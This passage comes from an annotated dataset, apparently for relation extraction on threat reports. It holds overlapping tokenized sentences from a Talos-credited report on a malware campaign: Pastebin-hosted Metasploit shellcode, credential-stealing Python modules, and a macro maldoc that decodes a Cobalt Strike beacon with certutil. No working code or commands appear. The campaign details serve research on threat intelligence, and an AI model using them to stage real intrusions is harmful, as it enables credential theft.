"Cobalt", "Strike", "beacons", ")", "."], ["The", "threat", "also", "begins", "with", "a", "maldoc", "containing", "a", "malicious", "macro", "."], ["The", "payload", "dropped", "to", "disk", "is", "a", "``", ".crt", "''", "file", "."], ["This", "file", "is", "decoded", "by", "the", "malicious", "macro", "using", "certutil", "'", "to", "obtain", "the", "next", "stage", "payload", "binary", "(", "EXE", ")", "which", "is", "then", "executed", "on", "the", "target", "endpoint", "."], ["The", "payload", "activated", "by", "the", "macro", "is", "not", "a", "dropper", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "infection chain", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "attack", "pos": [13, 14], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [15, 15], "name": "pastebin.com", "pos": [15, 16], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [21, 21], "name": "downloader shellcode", "pos": [21, 23], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "shellcode", "pos": [1, 2], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [64, 64], "name": "attacker", "pos": [36, 37], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [70, 70], "name": "shellcode", "pos": [42, 43], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [81, 81], "name": "modules", "pos": [2, 3], "index": "7_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [90, 90], "name": "system information", "pos": [11, 13], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [98, 98], "name": "server", "pos": [19, 20], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [106, 106], "name": "modules", "pos": [6, 7], "index": "10_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [108, 108], "name": "Credentials", "pos": [8, 9], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [112, 112], "name": "endpoint", "pos": [12, 13], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [142, 142], "name": "attack", "pos": [42, 43], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [146, 146], "name": "shellcode", "pos": [46, 47], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [152, 152], "name": "payload", "pos": [52, 53], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [160, 160], "name": "threat", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [165, 165], "name": "maldoc", "pos": [6, 7], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [172, 172], "name": "payload", "pos": [1, 2], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [179, 179], "name": ".crt", "pos": [8, 9], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [184, 184], "name": "file", "pos": [1, 2], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [190, 190], "name": "macro", "pos": [7, 8], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [192, 192], "name": "certutil", "pos": [9, 10], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [199, 199], "name": "payload binary", "pos": [16, 18], "index": "23_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [211, 211], "name": "endpoint", "pos": [28, 29], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [214, 214], "name": "payload", "pos": [1, 2], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [218, 218], "name": "macro", "pos": [5, 6], "index": "26_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [0], "h": 1, "t": 3}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 7}, {"r": "FR", "evidence": [0, 1, 2, 3], "h": 0, "t": 10}, {"r": "RD", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [1], "h": 4, "t": 6}, {"r": "RD", "evidence": [2], "h": 7, "t": 8}, {"r": "ST", "evidence": [2], "h": 7, "t": 9}, {"r": "RF", "evidence": [2], "h": 7, "t": 9}, {"r": "RD", "evidence": [3], "h": 10, "t": 11}, {"r": "ST", "evidence": [3], "h": 10, "t": 12}, {"r": "RF", "evidence": [3], "h": 10, "t": 12}, {"r": "FR", "evidence": [3], "h": 10, "t": 13}, {"r": "RD", "evidence": [3], "h": 13, "t": 14}, {"r": "EX", "evidence": [3], "h": 13, "t": 15}, {"r": "RD", "evidence": [4], "h": 16, "t": 17}, {"r": "CO", "evidence": [5], "h": 18, "t": 19}, {"r": "FR", "evidence": [6], "h": 21, "t": 22}, {"r": "WR", "evidence": [6], "t": 20, "h": 22}, {"r": "WR", "evidence": [6], "h": 22, "t": 23}, {"r": "ST", "evidence": [6], "h": 22, "t": 24}, {"r": "RF", "evidence": [6], "h": 22, "t": 24}, {"r": "CO", "evidence": [6, 7], "h": 21, "t": 26}, {"r": "EX", "evidence": [7], "t": 25, "h": 26}]}, {"title": "643-49", "sents": [["The", "shellcode", "hosted", "on", "pastebin", "is", "either", "created", "through", "a", "guest", "account", "or", "owned", "by", "five", "registered", "accounts", ",", "specifically", ":", "hxxps", ":", "//pastebin.com/u/r_ajeevshikra", "hxxps:", "//pastebin.com/u/ra_jeevshikra", "hxxps:", "//pastebin.com/u/raj_eevshikra", "hxxps:", "//pastebin.com/u/raje_evshikrahxxps", ":", "//pastebin.com/u/rajeev_shikraPastebin", "account", "operated", "by", "the", "attacker", ":", "The", "base64-encoded", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "hosted", "on", "Pastebin", "."], ["Two", "python", "modules", "discovered", "served", "the", "following", "purposes", ":", "Gather", "initial", "system", "information", "and", "send", "it", "to", "the", "C2", "server", "."], ["Sysinfo", "gathering", "capabilities", "of", "the", "Python", "modules", ":", "Credentials", "stolen", "from", "the", "endpoint", "by", "the", "other", "python", "module", "were", "from", ":", "Google", "ChromeMicrosoft", "EdgeOperaMozilla", "FirefoxWiFi", "credentialsCredential-stealing", "module", "of", "the", "attack", "(", "snip", ")", ":", "Evolution", "of", "attacksTalos", "discovered", "multiple", "variants", "of", "the", "attack", "instrumenting", "the", "Metasploit", "shellcode", "and", "ultimately", "activating", "the", "final", "payload", "(", "Cobalt", "Strike", "beacons", ")", "."], ["The", "threat", "also", "begins", "with", "a", "maldoc", "containing", "a", "malicious", "macro", "."], ["The", "payload", "dropped", "to", "disk", "is", "a", "``", ".crt", "''", "file", "."], ["This", "file", "is", "decoded", "by", "the", "malicious", "macro", "using", "certutil", "'", "to", "obtain", "the", "next", "stage", "payload", "binary", "(", "EXE", ")", "which", "is", "then", "executed", "on", "the", "target", "endpoint", "."], ["The", "payload", "activated", "by", "the", "macro", "is", "not", "a", "dropper", "."], ["This", "early", "variant", "of", "the", "attack", "does", "not", "utilize", "an", "intermediate", "dropper", "to", "download", "and", "activate", "the", "final", "beacon", "on", "the", "endpoint", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "shellcode", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [36, 36], "name": "attacker", "pos": [36, 37], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [42, 42], "name": "shellcode", "pos": [42, 43], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [53, 53], "name": "modules", "pos": [2, 3], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [62, 62], "name": "system information", "pos": [11, 13], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [70, 70], "name": "server", "pos": [19, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [78, 78], "name": "modules", "pos": [6, 7], "index": "6_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [80, 80], "name": "Credentials", "pos": [8, 9], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [84, 84], "name": "endpoint", "pos": [12, 13], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [114, 114], "name": "attack", "pos": [42, 43], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [118, 118], "name": "shellcode", "pos": [46, 47], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [124, 124], "name": "payload", "pos": [52, 53], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [132, 132], "name": "threat", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [137, 137], "name": "maldoc", "pos": [6, 7], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [144, 144], "name": "payload", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [151, 151], "name": ".crt", "pos": [8, 9], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [156, 156], "name": "file", "pos": [1, 2], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [162, 162], "name": "macro", "pos": [7, 8], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [164, 164], "name": "certutil", "pos": [9, 10], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [171, 171], "name": "payload binary", "pos": [16, 18], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [183, 183], "name": "endpoint", "pos": [28, 29], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [186, 186], "name": "payload", "pos": [1, 2], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [190, 190], "name": "macro", "pos": [5, 6], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [201, 201], "name": "attack", "pos": [5, 6], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [207, 207], "name": "dropper", "pos": [11, 12], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [214, 214], "name": "beacon", "pos": [18, 19], "index": "25_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [217, 217], "name": "endpoint", "pos": [21, 22], "index": "26_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "FR", "evidence": [2], "h": 6, "t": 9}, {"r": "RD", "evidence": [2], "h": 9, "t": 10}, {"r": "EX", "evidence": [2], "h": 9, "t": 11}, {"r": "RD", "evidence": [3], "h": 12, "t": 13}, {"r": "CO", "evidence": [4], "h": 14, "t": 15}, {"r": "FR", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5], "t": 16, "h": 18}, {"r": "WR", "evidence": [5], "h": 18, "t": 19}, {"r": "ST", "evidence": [5], "h": 18, "t": 20}, {"r": "RF", "evidence": [5], "h": 18, "t": 20}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 22}, {"r": "EX", "evidence": [6], "t": 21, "h": 22}, {"r": "FR", "evidence": [7], "h": 23, "t": 24}, {"r": "WR", "evidence": [7], "h": 24, "t": 25}, {"r": "EX", "evidence": [7], "h": 24, "t": 25}, {"r": "ST", "evidence": [7], "h": 24, "t": 26}, {"r": "RF", "evidence": [7], "h": 24, "t": 26}]}, {"title": "643-50", "sents": [["Two", "python", "modules", "discovered", "served", "the", "following", "purposes", ":", "Gather", "initial", "system", "information", "and", "send", "it", "to", "the", "C2", "server", "."], ["Sysinfo", "gathering", "capabilities", "of", "the", "Python", "modules", ":", "Credentials", "stolen", "from", "the", "endpoint", "by", "the", "other", "python", "module", "were", "from", ":", "Google", "ChromeMicrosoft", "EdgeOperaMozilla", "FirefoxWiFi", "credentialsCredential-stealing", "module", "of", "the", "attack", "(", "snip", ")", ":", "Evolution", "of", "attacksTalos", "discovered", "multiple", "variants", "of", "the", "attack", "instrumenting", "the", "Metasploit", "shellcode", "and", "ultimately", "activating", "the", "final", "payload", "(", "Cobalt", "Strike", "beacons", ")", "."], ["The", "threat", "also", "begins", "with", "a", "maldoc", "containing", "a", "malicious", "macro", "."], ["The", "payload", "dropped", "to", "disk", "is", "a", "``", ".crt", "''", "file", "."], ["This", "file", "is", "decoded", "by", "the", "malicious", "macro", "using", "certutil", "'", "to", "obtain", "the", "next", "stage", "payload", "binary", "(", "EXE", ")", "which", "is", "then", "executed", "on", "the", "target", "endpoint", "."], ["The", "payload", "activated", "by", "the", "macro", "is", "not", "a", "dropper", "."], ["This", "early", "variant", "of", "the", "attack", "does", "not", "utilize", "an", "intermediate", "dropper", "to", "download", "and", "activate", "the", "final", "beacon", "on", "the", "endpoint", "."], ["Instead", ",", "the", "binary", "decoded", "and", "executed", "on", "the", "endpoint", "by", "the", "malicious", "macro", "is", "just", "an", "SMB-based", "Cobalt", "Strike", "beacon", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "modules", "pos": [2, 3], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [11, 11], "name": "system information", "pos": [11, 13], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [19, 19], "name": "server", "pos": [19, 20], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "modules", "pos": [6, 7], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [29, 29], "name": "Credentials", "pos": [8, 9], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [33, 33], "name": "endpoint", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [63, 63], "name": "attack", "pos": [42, 43], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [67, 67], "name": "shellcode", "pos": [46, 47], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [73, 73], "name": "payload", "pos": [52, 53], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [81, 81], "name": "threat", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [86, 86], "name": "maldoc", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "payload", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [100, 100], "name": ".crt", "pos": [8, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [105, 105], "name": "file", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [111, 111], "name": "macro", "pos": [7, 8], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [113, 113], "name": "certutil", "pos": [9, 10], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [120, 120], "name": "payload binary", "pos": [16, 18], "index": "16_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [132, 132], "name": "endpoint", "pos": [28, 29], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [135, 135], "name": "payload", "pos": [1, 2], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [139, 139], "name": "macro", "pos": [5, 6], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [150, 150], "name": "attack", "pos": [5, 6], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [156, 156], "name": "dropper", "pos": [11, 12], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [163, 163], "name": "beacon", "pos": [18, 19], "index": "22_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [166, 166], "name": "endpoint", "pos": [21, 22], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [171, 171], "name": "binary", "pos": [3, 4], "index": "24_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [177, 177], "name": "endpoint", "pos": [9, 10], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [181, 181], "name": "macro", "pos": [13, 14], "index": "26_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [188, 188], "name": "beacon", "pos": [20, 21], "index": "27_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "FR", "evidence": [1], "h": 3, "t": 6}, {"r": "RD", "evidence": [1], "h": 6, "t": 7}, {"r": "EX", "evidence": [1], "h": 6, "t": 8}, {"r": "RD", "evidence": [2], "h": 9, "t": 10}, {"r": "CO", "evidence": [3], "h": 11, "t": 12}, {"r": "FR", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "t": 13, "h": 15}, {"r": "WR", "evidence": [4], "h": 15, "t": 16}, {"r": "ST", "evidence": [4], "h": 15, "t": 17}, {"r": "RF", "evidence": [4], "h": 15, "t": 17}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 19}, {"r": "EX", "evidence": [5], "t": 18, "h": 19}, {"r": "FR", "evidence": [6], "h": 20, "t": 21}, {"r": "WR", "evidence": [6], "h": 21, "t": 22}, {"r": "EX", "evidence": [6], "h": 21, "t": 22}, {"r": "ST", "evidence": [6], "h": 21, "t": 23}, {"r": "RF", "evidence": [6], "h": 21, "t": 23}, {"r": "WR", "evidence": [7], "t": 24, "h": 26}, {"r": "EX", "evidence": [7], "t": 24, "h": 26}, {"r": "ST", "evidence": [7], "t": 25, "h": 26}, {"r": "RF", "evidence": [7], "t": 25, "h": 26}, {"r": "CO", "evidence": [7], "h": 24, "t": 27}]}, {"title": "643-51", "sents": [["Sysinfo", "gathering", "capabilities", "of", "the", "Python", "modules", ":", "Credentials", "stolen", "from", "the", "endpoint", "by", "the", "other", "python", "module", "were", "from", ":", "Google", "ChromeMicrosoft", "EdgeOperaMozilla", "FirefoxWiFi", "credentialsCredential-stealing", "module", "of", "the", "attack", "(", "snip", ")", ":", "Evolution", "of", "attacksTalos", "discovered", "multiple", "variants", "of", "the", "attack", "instrumenting", "the", "Metasploit", "shellcode", "and", "ultimately", "activating", "the", "final", "payload", "(", "Cobalt", "Strike", "beacons", ")", "."], ["The", "threat", "also", "begins", "with", "a", "maldoc", "containing", "a", "malicious", "macro", "."], ["The", "payload", "dropped", "to", "disk", "is", "a", "``", ".crt", "''", "file", "."], ["This", "file", "is", "decoded", "by", "the", "malicious", "macro", "using", "certutil", "'", "to", "obtain", "the", "next", "stage", "payload", "binary", "(", "EXE", ")", "which", "is", "then", "executed", "on", "the", "target", "endpoint", "."], ["The", "payload", "activated", "by", "the", "macro", "is", "not", "a", "dropper", "."], ["This", "early", "variant", "of", "the", "attack", "does", "not", "utilize", "an", "intermediate", "dropper", "to", "download", "and", "activate", "the", "final", "beacon", "on", "the", "endpoint", "."], ["Instead", ",", "the", "binary", "decoded", "and", "executed", "on", "the", "endpoint", "by", "the", "malicious", "macro", "is", "just", "an", "SMB-based", "Cobalt", "Strike", "beacon", "."], ["This", "attack-chain", "consists", "of", "a", "maldoc", "with", "an", "embedded", "macro", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "modules", "pos": [6, 7], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [8, 8], "name": "Credentials", "pos": [8, 9], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [12, 12], "name": "endpoint", "pos": [12, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [42, 42], "name": "attack", "pos": [42, 43], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [46, 46], "name": "shellcode", "pos": [46, 47], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [52, 52], "name": "payload", "pos": [52, 53], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [60, 60], "name": "threat", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [65, 65], "name": "maldoc", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [72, 72], "name": "payload", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": ".crt", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [84, 84], "name": "file", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "macro", "pos": [7, 8], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [92, 92], "name": "certutil", "pos": [9, 10], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [99, 99], "name": "payload binary", "pos": [16, 18], "index": "13_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [111, 111], "name": "endpoint", "pos": [28, 29], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [114, 114], "name": "payload", "pos": [1, 2], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [118, 118], "name": "macro", "pos": [5, 6], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [129, 129], "name": "attack", "pos": [5, 6], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [135, 135], "name": "dropper", "pos": [11, 12], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [142, 142], "name": "beacon", "pos": [18, 19], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [145, 145], "name": "endpoint", "pos": [21, 22], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [150, 150], "name": "binary", "pos": [3, 4], "index": "21_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [156, 156], "name": "endpoint", "pos": [9, 10], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [160, 160], "name": "macro", "pos": [13, 14], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [167, 167], "name": "beacon", "pos": [20, 21], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [170, 170], "name": "attack-chain", "pos": [1, 2], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [174, 174], "name": "maldoc", "pos": [5, 6], "index": "26_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [178, 178], "name": "macro", "pos": [9, 10], "index": "27_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0], "h": 3, "t": 4}, {"r": "EX", "evidence": [0], "h": 3, "t": 5}, {"r": "RD", "evidence": [1], "h": 6, "t": 7}, {"r": "CO", "evidence": [2], "h": 8, "t": 9}, {"r": "FR", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "t": 10, "h": 12}, {"r": "WR", "evidence": [3], "h": 12, "t": 13}, {"r": "ST", "evidence": [3], "h": 12, "t": 14}, {"r": "RF", "evidence": [3], "h": 12, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 16}, {"r": "EX", "evidence": [4], "t": 15, "h": 16}, {"r": "FR", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5], "h": 18, "t": 19}, {"r": "EX", "evidence": [5], "h": 18, "t": 19}, {"r": "ST", "evidence": [5], "h": 18, "t": 20}, {"r": "RF", "evidence": [5], "h": 18, "t": 20}, {"r": "WR", "evidence": [6], "t": 21, "h": 23}, {"r": "EX", "evidence": [6], "t": 21, "h": 23}, {"r": "ST", "evidence": [6], "t": 22, "h": 23}, {"r": "RF", "evidence": [6], "t": 22, "h": 23}, {"r": "CO", "evidence": [6], "h": 21, "t": 24}, {"r": "WR", "evidence": [7], "h": 25, "t": 26}, {"r": "WR", "evidence": [7], "h": 25, "t": 27}]}, {"title": "643-52", "sents": [["The", "threat", "also", "begins", "with", "a", "maldoc", "containing", "a", "malicious", "macro", "."], ["The", "payload", "dropped", "to", "disk", "is", "a", "``", ".crt", "''", "file", "."], ["This", "file", "is", "decoded", "by", "the", "malicious", "macro", "using", "certutil", "'", "to", "obtain", "the", "next", "stage", "payload", "binary", "(", "EXE", ")", "which", "is", "then", "executed", "on", "the", "target", "endpoint", "."], ["The", "payload", "activated", "by", "the", "macro", "is", "not", "a", "dropper", "."], ["This", "early", "variant", "of", "the", "attack", "does", "not", "utilize", "an", "intermediate", "dropper", "to", "download", "and", "activate", "the", "final", "beacon", "on", "the", "endpoint", "."], ["Instead", ",", "the", "binary", "decoded", "and", "executed", "on", "the", "endpoint", "by", "the", "malicious", "macro", "is", "just", "an", "SMB-based", "Cobalt", "Strike", "beacon", "."], ["This", "attack-chain", "consists", "of", "a", "maldoc", "with", "an", "embedded", "macro", "."], ["The", "macro", "consists", "of", "code", "that", "can", "inject", "the", "hardcoded", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "into", "a", "benign", "32-bit", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "threat", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "maldoc", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "payload", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": ".crt", "pos": [8, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [25, 25], "name": "file", "pos": [1, 2], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [31, 31], "name": "macro", "pos": [7, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [33, 33], "name": "certutil", "pos": [9, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "payload binary", "pos": [16, 18], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [52, 52], "name": "endpoint", "pos": [28, 29], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [55, 55], "name": "payload", "pos": [1, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [59, 59], "name": "macro", "pos": [5, 6], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [70, 70], "name": "attack", "pos": [5, 6], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [76, 76], "name": "dropper", "pos": [11, 12], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [83, 83], "name": "beacon", "pos": [18, 19], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [86, 86], "name": "endpoint", "pos": [21, 22], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [91, 91], "name": "binary", "pos": [3, 4], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [97, 97], "name": "endpoint", "pos": [9, 10], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [101, 101], "name": "macro", "pos": [13, 14], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [108, 108], "name": "beacon", "pos": [20, 21], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [111, 111], "name": "attack-chain", "pos": [1, 2], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [115, 115], "name": "maldoc", "pos": [5, 6], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [119, 119], "name": "macro", "pos": [9, 10], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [122, 122], "name": "macro", "pos": [1, 2], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [125, 125], "name": "code", "pos": [4, 5], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [133, 133], "name": "shellcode", "pos": [12, 13], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [142, 142], "name": "process", "pos": [21, 22], "index": "25_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "t": 4, "h": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 10}, {"r": "EX", "evidence": [3], "t": 9, "h": 10}, {"r": "FR", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "EX", "evidence": [4], "h": 12, "t": 13}, {"r": "ST", "evidence": [4], "h": 12, "t": 14}, {"r": "RF", "evidence": [4], "h": 12, "t": 14}, {"r": "WR", "evidence": [5], "t": 15, "h": 17}, {"r": "EX", "evidence": [5], "t": 15, "h": 17}, {"r": "ST", "evidence": [5], "t": 16, "h": 17}, {"r": "RF", "evidence": [5], "t": 16, "h": 17}, {"r": "CO", "evidence": [5], "h": 15, "t": 18}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "WR", "evidence": [6], "h": 19, "t": 21}, {"r": 